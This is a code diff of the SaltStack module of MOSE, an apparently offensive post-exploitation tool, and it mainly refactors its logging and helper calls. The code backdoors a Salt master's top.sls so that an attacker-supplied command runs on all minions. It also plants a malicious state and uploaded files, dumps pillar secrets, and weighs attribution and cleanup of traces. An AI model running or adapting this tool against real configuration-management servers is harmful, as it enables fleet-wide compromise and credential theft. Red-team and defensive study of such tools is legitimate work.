@@ -6,16 +6,18 @@ package main
 import (
 	"flag"
 	"fmt"
-	"log"
 	"os"
 	"path/filepath"
 	"strings"
 	"text/template"
 
+	"github.com/master-of-servers/mose/pkg/moseutils"
+	"github.com/master-of-servers/mose/pkg/system"
+
 	"github.com/ghodss/yaml"
 	"github.com/gobuffalo/packr/v2"
-	utils "github.com/l50/goutils"
-	"github.com/master-of-servers/mose/pkg/moseutils"
+	"github.com/rs/zerolog"
+	"github.com/rs/zerolog/log"
 )
 
 type Command struct {
@@ -52,27 +54,26 @@ func init() {
 }
 
 func backdoorTop(topLoc string) {
-	bytes, err := moseutils.ReadBytesFromFile(topLoc)
+	bytes, err := system.ReadBytesFromFile(topLoc)
 	if err != nil {
-		moseutils.Info(fmt.Sprint(err))
-		log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
+		log.Fatal().Err(err).Msgf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
 	}
 
 	var unmarshalled map[string]interface{}
 	err = yaml.Unmarshal(bytes, &unmarshalled)
 	if err != nil {
-		log.Fatal(err)
+		log.Fatal().Err(err).Msg("Quitting...")
 	}
 	//I am going to prompt questions before hand because reiterating through this is a monster
 	ans, err := moseutils.AskUserQuestion("Would you like to inject all layers?", a.OsTarget)
 	if err != nil {
-		log.Fatalf("Quitting...")
+		log.Fatal().Err(err).Msg("Quitting...")
 	}
 	injectAll := ans
 
 	ans, err = moseutils.AskUserQuestion("Would you like to add  all to layers if no '*' is found?", a.OsTarget)
 	if err != nil {
-		log.Fatalf("Quitting...")
+		log.Fatal().Err(err).Msg("Quitting...")
 	}
 	addAllIfNone := ans
 
@@ -98,7 +99,7 @@ func backdoorTop(topLoc string) {
 			}
 		}
 	} else if err != nil {
-		log.Fatalf("Quitting...")
+		log.Fatal().Err(err).Msg("Quitting...")
 	}
 
 	unmarshalled, _ = injectYaml(unmarshalled, false, false, mapOfInjects)
@@ -107,20 +108,20 @@ func backdoorTop(topLoc string) {
 }
 
 func prettyPrint(data map[int]string) {
-	moseutils.Info("Specific injection method requested, displaying indicies to select")
+	log.Info().Msg("Specific injection method requested, displaying indicies to select")
 	for i := 0; i < len(data); i++ {
-		moseutils.Msg(fmt.Sprintf("[%d] %s", i, data[i]))
+		log.Log().Msgf("[%d] %s", i, data[i])
 	}
 }
 
 func validateIndicies(data map[string]map[string]bool) (map[int]bool, map[int]string) {
 	validIndex := make(map[int]string, 0)
 	validIndexBool := make(map[int]bool, 0)
-	moseutils.Info("Specific injection method requested, displaying indicies to select")
+	log.Info().Msg("Specific injection method requested, displaying indicies to select")
 	for k, v := range data {
 		ind := 0
 		for k1, _ := range v {
-			moseutils.Msg(fmt.Sprintf("[%d] Fileroot: %v Hosts: %v", ind, k, k1))
+			log.Log().Msgf("[%d] Fileroot: %v Hosts: %v", ind, k, k1)
 			validIndex[ind] = fmt.Sprintf("Fileroot: %v Hosts: %v", k, k1)
 			validIndexBool[ind] = true
 			ind += 1
@@ -196,24 +197,24 @@ func createState(topLoc string, cmd string) {
 
 	stateFilePath := filepath.Join(topLocPath, saltState, saltState+".sls")
 
-	if moseutils.CreateFolders(stateFolders) && generateState(stateFilePath, cmd, saltState) {
-		moseutils.Msg("Successfully created the %s state at %s", saltState, stateFilePath)
-		moseutils.Msg("Adding folder %s to cleanup file", stateFolderLoc)
+	if system.CreateFolders(stateFolders) && generateState(stateFilePath, cmd, saltState) {
+		log.Log().Msgf("Successfully created the %s state at %s", saltState, stateFilePath)
+		log.Log().Msgf("Adding folder %s to cleanup file", stateFolderLoc)
 		// Track the folders for clean up purposes
 		moseutils.TrackChanges(cleanupFile, stateFolderLoc)
 		if uploadFileName != "" {
 			saltFileFolders := filepath.Join(stateFolderLoc, "files")
 
-			moseutils.CreateFolders([]string{saltFileFolders})
-			moseutils.Info("Copying  %s to module location %s", uploadFileName, saltFileFolders)
-			moseutils.CpFile(uploadFileName, filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
+			system.CreateFolders([]string{saltFileFolders})
+			log.Log().Msgf("Copying  %s to module location %s", uploadFileName, saltFileFolders)
+			system.CpFile(uploadFileName, filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
 			if err := os.Chmod(filepath.Join(saltFileFolders, filepath.Base(uploadFileName)), 0644); err != nil {
-				log.Fatal(err)
+				log.Fatal().Err(err).Msg("")
 			}
-			moseutils.Info("Successfully copied and chmod file %s", filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
+			log.Log().Msgf("Successfully copied and chmod file %s", filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
 		}
 	} else {
-		log.Fatalf("Failed to create %s state", saltState)
+		log.Fatal().Msgf("Failed to create %s state", saltState)
 	}
 }
 
@@ -232,25 +233,25 @@ func generateState(stateFile string, cmd string, stateName string) bool {
 	}
 
 	if err != nil {
-		log.Fatal("Parse: ", err)
+		log.Fatal().Err(err).Msg("Parse: ")
 	}
 
 	t, err := template.New("saltState").Parse(s)
 
 	if err != nil {
-		log.Fatal("Parse: ", err)
+		log.Fatal().Err(err).Msg("Parse: ")
 	}
 
 	f, err := os.Create(stateFile)
 
 	if err != nil {
-		log.Fatalln(err)
+		log.Fatal().Err(err).Msg("")
 	}
 
 	err = t.Execute(f, saltCommands)
 
 	if err != nil {
-		log.Fatal("Execute: ", err)
+		log.Fatal().Err(err).Msg("Execute: ")
 	}
 
 	f.Close()
@@ -262,7 +263,7 @@ func doCleanup(siteLoc string) {
 	moseutils.TrackChanges(cleanupFile, cleanupFile)
 	ans, err := moseutils.AskUserQuestion("Would you like to remove all files associated with a previous run?", osTarget)
 	if err != nil {
-		log.Fatal("Quitting...")
+		log.Fatal().Err(err).Msg("Quitting: ")
 	}
 	moseutils.RemoveTracker(cleanupFile, osTarget, ans)
 
@@ -273,18 +274,18 @@ func doCleanup(siteLoc string) {
 
 	path = path + ".bak.mose"
 
-	if !moseutils.FileExists(path) {
-		moseutils.Info("Backup file %s does not exist, skipping", path)
+	if !system.FileExists(path) {
+		log.Info().Msgf("Backup file %s does not exist, skipping", path)
 	}
 	ans2 := false
 	if !ans {
 		ans2, err = moseutils.AskUserQuestion(fmt.Sprintf("Overwrite %s with %s", siteLoc, path), osTarget)
 		if err != nil {
-			log.Fatal("Quitting...")
+			log.Fatal().Err(err).Msg("Quitting: ")
 		}
 	}
 	if ans || ans2 {
-		moseutils.CpFile(path, siteLoc)
+		system.CpFile(path, siteLoc)
 		os.Remove(path)
 	}
 	os.Exit(0)
@@ -295,57 +296,62 @@ func backupSite(siteLoc string) {
 	if saltBackupLoc != "" {
 		path = filepath.Join(saltBackupLoc, filepath.Base(siteLoc))
 	}
-	if !moseutils.FileExists(path + ".bak.mose") {
-		moseutils.CpFile(siteLoc, path+".bak.mose")
+	if !system.FileExists(path + ".bak.mose") {
+		system.CpFile(siteLoc, path+".bak.mose")
 		return
 	}
-	moseutils.Info("Backup of the top.sls (%v.bak.mose) already exists.", siteLoc)
+	log.Info().Msgf("Backup of the top.sls (%v.bak.mose) already exists.", siteLoc)
 	return
 }
 
 func writeYamlToTop(topSlsYaml map[string]interface{}, fileLoc string) {
 	marshalled, err := yaml.Marshal(&topSlsYaml)
 	if err != nil {
-		log.Fatal(err)
+		log.Fatal().Err(err).Msg("")
 	}
 
-	err = moseutils.WriteBytesToFile(fileLoc, marshalled, 0644)
+	err = system.WriteBytesToFile(fileLoc, marshalled, 0644)
 	if err != nil {
-		log.Fatalf("error: %v", err)
+		log.Fatal().Err(err).Msg("")
 	}
-	moseutils.Info("%s successfully created", fileLoc)
+	log.Info().Msgf("%s successfully created", fileLoc)
 }
 
 func getPillarSecrets(binLoc string) {
 	//Running command salt '*' pillar.items
-	res, err := utils.RunCommand(binLoc, "*", "pillar.items")
+	res, err := system.RunCommand(binLoc, "*", "pillar.items")
 	if err != nil {
-		moseutils.Info("Error running command: %s '*' pillar.items", binLoc)
-		log.Fatal(err)
+		log.Info().Msgf("Error running command: %s '*' pillar.items", binLoc)
+		log.Fatal().Err(err).Msg("")
 	}
-	moseutils.Msg("%s", res)
+	log.Info().Msgf("%s", res)
 
 	return
 }
 
 func main() {
+	zerolog.SetGlobalLevel(zerolog.InfoLevel)
+	if debug {
+		zerolog.SetGlobalLevel(zerolog.DebugLevel)
+	}
+	log.Logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr})
 	// parse args
 	flag.Parse()
 
 	// gonna assume not root then we screwed
-	utils.CheckRoot()
+	system.CheckRoot()
 
 	if uploadFilePath != "" {
 		moseutils.TrackChanges(cleanupFile, uploadFilePath)
 	}
 
-	found, binLoc := moseutils.FindFile("salt", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
+	found, binLoc := system.FindFile("salt", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
 	if !found {
-		log.Fatalf("salt binary not found, exiting...")
+		log.Fatal().Msg("salt binary not found, exiting...")
 	}
-	found, topLoc := moseutils.FindFile("top.sls", []string{"/srv/salt"})
+	found, topLoc := system.FindFile("top.sls", []string{"/srv/salt"})
 	if !found {
-		log.Fatalf("top.sls not found, exiting...")
+		log.Fatal().Msg("top.sls not found, exiting...")
 	}
 
 	if cleanup {
@@ -354,13 +360,13 @@ func main() {
 	if ans, err := moseutils.AskUserQuestion("Do you want to create a backup of the manifests? This can lead to attribution, but can save your bacon if you screw something up or if you want to be able to automatically clean up. ", a.OsTarget); ans && err == nil {
 		backupSite(topLoc)
 	} else if err != nil {
-		log.Fatalf("Error backing up %s: %v, exiting...", topLoc, err)
+		log.Fatal().Msgf("Error backing up %s: %v, exiting...", topLoc, err)
 	}
 
-	moseutils.Msg("Backdooring the %s top.sls to run %s on all minions, please wait...", topLoc, bdCmd)
+	log.Log().Msgf("Backdooring the %s top.sls to run %s on all minions, please wait...", topLoc, bdCmd)
 	backdoorTop(topLoc)
 	createState(topLoc, bdCmd)
 
-	moseutils.Info("Attempting to find secrets stored with salt Pillars")
+	log.Info().Msg("Attempting to find secrets stored with salt Pillars")
 	getPillarSecrets(strings.TrimSpace(binLoc))
 }
